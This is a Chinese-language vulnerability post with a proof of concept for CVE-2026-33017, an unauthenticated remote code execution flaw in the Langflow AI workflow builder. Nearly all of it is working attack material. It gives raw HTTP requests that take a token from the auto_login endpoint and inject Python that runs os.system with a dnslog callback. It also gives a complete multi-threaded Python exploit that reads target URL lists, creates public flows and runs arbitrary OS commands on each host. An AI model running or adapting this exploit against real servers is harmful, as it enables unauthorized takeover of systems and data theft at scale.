# Langflow框架远程代码执行(CVE-2026-33017)

# 漏洞简介
Langflow是Langflow开源的一个用于构建多代理和 RAG 应用程序的可视化框架。‌是一个面向开发者的低代码工具，专注于多智能体人工智能、提示工程和检索增强生成（RAG）应用的开发。它能够帮助开发者轻松构建强大的AI智能体和工作流，通过可视化方式搭建AI应用，通过拖放操作创建复杂的AI工作流，从而降低开发门槛，减少编写样板代码的工作量，使开发者能够更多地专注于创新‌。

# poc
利用信息泄露获取到jwt凭证
```javascript
https://xxxxx/api/v1/auto_login
```
使用公共流程载体，记录public的值
```javascript
GET /api/v1/flows/ HTTP/1.1
Host: xxxxx
User-Agent: python-requests/2.32.5
Accept-Encoding: gzip, deflate, br
Accept:*/*
Connection: keep-alive
Authorization:Bearer 凭证

```

然后执行命令如下
```javascript
POST /api/v1/build_public_tmp/368e2480-c92c-4ee4-b18f-3cfdd7bc5fea/flow HTTP/1.1
Host: xxxxx
Content-Type: application/json
Cookie: client_id=pwn_research
Connection: close
Content-Length: 1157

{"data": {"nodes": [{"id": "Test", "type": "genericNode", "position": {"x": 0, "y": 0}, "data": {"id": "Test", "type": "Test", "node": {"template": {"code": {"type": "code", "required": true, "show": true, "multiline": true, "value": "import os, socket, json as _json\n\n_command = os.system(\"5vbe6o.dnslog.cn\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})", "name": "code", "password": false, "advanced": false, "dynamic": false}, "_type": "Component"}, "description": "X", "base_classes": ["Data"], "display_name": "Test", "name": "Test", "frozen": false, "outputs": [{"types": ["Data"], "selected": "Data", "name": "o", "display_name": "O", "method": "r", "value": "__UNDEFINED__", "cache": true, "allows_loop": false, "tool_mode": false, "hidden": null, "required_inputs": null, "group_outputs": false}], "field_order": ["code"], "beta": false, "edited": false}}}], "edges": []}, "inputs": null}
```
python脚本
```javascript
#!/usr/bin/env python3
"""
CVE-2026-33017 - Langflow Unauthenticated RCE PoC
==================================================
Affected : Langflow <= 1.8.1
Type     : Unauthenticated Remote Code Execution
Endpoint : POST /api/v1/build_public_tmp/{flow_id}/flow

Root cause : prepare_global_scope() (validate.py) calls exec() on the code
of each CustomComponent node without sandboxing. A module-level assignment
(_r = os.system(...)) is triggered during graph compilation.
Exfiltration must happen via an outbound callback (curl webhook, reverse shell).

Scenario A — AUTO_LOGIN=true : token obtained without credentials, PUBLIC flow created.
Scenario B — Known public flow (shared link) : direct exploitation without authentication.
"""

import argparse
import json
import sys
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

_print_lock = threading.Lock()


def log(target: str, msg: str) -> None:
    with _print_lock:
        print(f"[{target}] {msg}")


def get_auth_token(base_url: str, timeout: int) -> str | None:
    try:
        resp = requests.get(f"{base_url}/api/v1/auto_login", timeout=timeout)
        if resp.status_code == 200:
            return resp.json().get("access_token")
    except (requests.RequestException, ValueError):
        pass
    return None


def find_public_flow(base_url: str, token: str, timeout: int) -> tuple[str | None, str | None]:
    try:
        resp = requests.get(
            f"{base_url}/api/v1/flows/",
            headers={"Authorization": f"Bearer {token}"},
            timeout=timeout,
        )
        resp.raise_for_status()
        flows = resp.json()
        if not isinstance(flows, list):
            return None, None
        for flow in flows:
            if flow.get("access_type") == "PUBLIC":
                return flow["id"], flow.get("name", "?")
    except (requests.RequestException, ValueError, KeyError):
        pass
    return None, None


def create_public_flow(base_url: str, token: str, timeout: int) -> str:
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    body = {
        "name": f"lab-{uuid.uuid4().hex[:8]}",
        "data": {"nodes": [], "edges": [], "viewport": {}},
        "is_component": False,
        "access_type": "PUBLIC",
        "description": "CVE-2026-33017 lab flow",
    }
    resp = requests.post(f"{base_url}/api/v1/flows/", json=body, headers=headers, timeout=timeout)
    resp.raise_for_status()
    flow    = resp.json()
    flow_id = flow.get("id")
    if not flow_id:
        raise ValueError(f"create_flow: no id in response: {flow}")

    if flow.get("access_type") != "PUBLIC":
        requests.patch(
            f"{base_url}/api/v1/flows/{flow_id}",
            json={"access_type": "PUBLIC"},
            headers=headers,
            timeout=timeout,
        ).raise_for_status()

    return flow_id


def delete_flow(base_url: str, token: str, flow_id: str, timeout: int) -> None:
    try:
        requests.delete(
            f"{base_url}/api/v1/flows/{flow_id}",
            headers={"Authorization": f"Bearer {token}"},
            timeout=timeout,
        )
    except requests.RequestException:
        pass


def build_exploit_payload(command: str) -> dict:
    malicious_code = f"""\
from langflow.custom import Component
from langflow.io import Output

_r = __import__('os').system({repr(command)})


class ExploitComponent(Component):
    display_name = "ExploitComponent"
    description  = "CVE-2026-33017 PoC"
    outputs = [Output(display_name="Result", name="output", method="run")]

    def run(self) -> str:
        return "ok"
"""
    node_id = str(uuid.uuid4())
    return {
        "data": {
            "nodes": [
                {
                    "id": node_id,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": malicious_code,
                                    "type": "code",
                                    "required": True,
                                    "show": True,
                                    "name": "code",
                                    "dynamic": False,
                                    "list": False,
                                    "multiline": True,
                                },
                            },
                            "description": "poc",
                            "display_name": "ExploitComponent",
                            "custom_fields": {},
                            "output_types": ["str"],
                            "base_classes": ["str"],
                            "outputs": [
                                {
                                    "display_name": "Result",
                                    "name": "output",
                                    "method": "run",
                                    "selected": "str",
                                    "types": ["str"],
                                    "value": "__UNDEFINED__",
                                }
                            ],
                        },
                    },
                }
            ],
            "edges": [],
            "viewport": {"x": 0, "y": 0, "zoom": 1},
        }
    }


def _poll_job_result(base_url: str, job_id: str, client_id: str, token: str, timeout: int) -> bool:
    headers = {"Accept": "application/x-ndjson"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        with requests.get(
            f"{base_url}/api/v1/build/{job_id}/events",
            headers=headers,
            cookies={"client_id": client_id},
            stream=True,
            timeout=timeout,
        ) as r:
            for raw_line in r.iter_lines():
                if not raw_line:
                    continue
                if isinstance(raw_line, bytes):
                    raw_line = raw_line.decode("utf-8", errors="replace")
                try:
                    evt = json.loads(raw_line)
                    if evt.get("event") == "end_vertex":
                        return bool(evt.get("data", {}).get("build_data", {}).get("valid"))
                except json.JSONDecodeError:
                    pass
    except requests.RequestException:
        pass
    return False


def send_exploit(base_url: str, flow_id: str, command: str, token: str, timeout: int) -> bool:
    payload   = build_exploit_payload(command)
    client_id = str(uuid.uuid4())
    endpoint  = f"{base_url}/api/v1/build_public_tmp/{flow_id}/flow"

    resp = requests.post(endpoint, json=payload, cookies={"client_id": client_id}, timeout=timeout)

    if resp.status_code == 403 and token:
        resp = requests.post(
            endpoint,
            json=payload,
            cookies={"client_id": client_id},
            headers={"Authorization": f"Bearer {token}"},
            timeout=timeout,
        )

    if resp.status_code not in (200, 201):
        return False

    try:
        data = resp.json()
    except ValueError:
        return False

    job_id = data.get("job_id")
    if not job_id:
        return False

    return _poll_job_result(base_url, job_id, client_id, token, timeout)


def exploit_target(
    base_url: str,
    cmd: str,
    flow_id_arg: str | None,
    timeout: int,
    no_cleanup: bool,
) -> dict:
    def err(detail: str) -> dict:
        return {"url": base_url, "status": "ERROR", "detail": detail}

    token = get_auth_token(base_url, timeout)
    log(base_url, f"auth: {'JWT token obtained' if token else 'no token (scenario B)'}")

    flow_id      = flow_id_arg
    flow_created = False

    if flow_id:
        log(base_url, f"flow: provided via argument ({flow_id})")
    elif token:
        flow_id, flow_name = find_public_flow(base_url, token, timeout)
        if flow_id:
            log(base_url, f"flow: existing public flow — {flow_name} ({flow_id})")
        else:
            try:
                flow_id      = create_public_flow(base_url, token, timeout)
                flow_created = True
                log(base_url, f"flow: created ({flow_id})")
            except (requests.RequestException, ValueError) as e:
                log(base_url, f"flow: creation failed — {e}")
                return err(f"create_flow: {e}")
    else:
        log(base_url, "no token and no --flow-id provided")
        return err("no token and no --flow-id provided")

    try:
        success = send_exploit(base_url, flow_id, cmd, token or "", timeout)
    except requests.RequestException as e:
        log(base_url, f"exploit: network error — {e}")
        return err(f"send_exploit: {e}")
    finally:
        if flow_created and not no_cleanup:
            delete_flow(base_url, token, flow_id, timeout)
            log(base_url, f"flow: deleted ({flow_id})")

    if success:
        log(base_url, "[+] VULNERABLE — RCE executed")
        return {"url": base_url, "status": "VULNERABLE", "detail": ""}
    else:
        log(base_url, "[-] FAILED — build invalide ou non confirmé")
        return {"url": base_url, "status": "FAILED", "detail": "invalid build"}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CVE-2026-33017 — Langflow RCE PoC (educational / lab use only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--url",        default=None,         help="Single target Langflow URL")
    parser.add_argument("--url-file",   default=None,         help="Text file with one URL per line")
    parser.add_argument("--cmd",        default="id",         help="OS command to execute (default: id)")
    parser.add_argument("--flow-id",    default=None,         help="UUID of an existing public flow (optional)")
    parser.add_argument("--threads",    type=int, default=5,  help="Parallel threads (default: 5)")
    parser.add_argument("--timeout",    type=int, default=15, help="HTTP timeout in seconds (default: 15)")
    parser.add_argument("--no-cleanup", action="store_true",  help="Do not delete the created flow after exploitation")
    args = parser.parse_args()

    targets: list[str] = []
    if args.url:
        targets.append(args.url.rstrip("/"))
    if args.url_file:
        try:
            with open(args.url_file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line.rstrip("/"))
        except OSError as e:
            print(f"[-] Cannot read {args.url_file}: {e}")
            sys.exit(1)

    if not targets:
        parser.error("Provide --url or --url-file")

    targets = list(dict.fromkeys(targets))  # order-preserving deduplication

    print(f"\n{'='*60}")
    print(f"  CVE-2026-33017 — Langflow RCE PoC")
    print(f"{'='*60}")
    print(f"  Targets : {len(targets)}")
    print(f"  Command : {args.cmd}")
    print(f"  Threads : {args.threads}  |  Timeout : {args.timeout}s")
    print(f"{'='*60}\n")

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {
            pool.submit(
                exploit_target,
                url, args.cmd,
                args.flow_id, args.timeout, args.no_cleanup,
            ): url
            for url in targets
        }
        for future in as_completed(futures):
            try:
                results.append(future.result())
            except Exception as e:
                results.append({"url": futures[future], "status": "ERROR", "detail": str(e)})

    flags = {"VULNERABLE": "[+]", "FAILED": "[-]", "ERROR": "[!]"}
    col   = max(len(r["url"]) for r in results)

    print(f"\n{'='*60}")
    print(f"  SUMMARY")
    print(f"{'='*60}")
    for r in sorted(results, key=lambda x: x["status"]):
        flag   = flags.get(r["status"], "[ ]")
        detail = f"  {r['detail']}" if r["detail"] else ""
        print(f"  {flag} {r['url']:<{col}}  {r['status']}{detail}")
    print(f"{'='*60}")

    vuln_count = sum(1 for r in results if r["status"] == "VULNERABLE")
    print(f"\n  {vuln_count}/{len(results)} target(s) vulnerable\n")


if __name__ == "__main__":
    main()
```
https://github.com/MaxMnMl/langflow-CVE-2026-33017-poc
